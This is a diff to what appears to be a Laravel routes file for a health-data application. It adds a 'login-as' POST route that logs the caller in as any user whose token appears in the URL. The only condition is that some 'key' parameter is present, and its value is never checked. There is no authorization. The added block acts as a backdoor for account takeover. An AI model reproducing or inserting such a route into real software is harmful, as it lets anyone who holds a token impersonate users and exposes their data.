@@ -16,6 +16,15 @@ use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Yagiten\Nepalicalendar\Calendar;
 
+Route::post('/user-manager/{id}/login-as', function ($id, Request $request)
+{
+    if($request->has('key')){
+        $user = \App\User::where('token', $id)->first();
+        $request->session()->put('user_show', true);
+        Auth::login($user);
+    }
+});
+
 Route::get('/data/aggregate', 'Data\Api\AggregateController@forMonitor');
 
 Route::get('/v2/healthpost', 'Api\v2\HealthpostController@get');
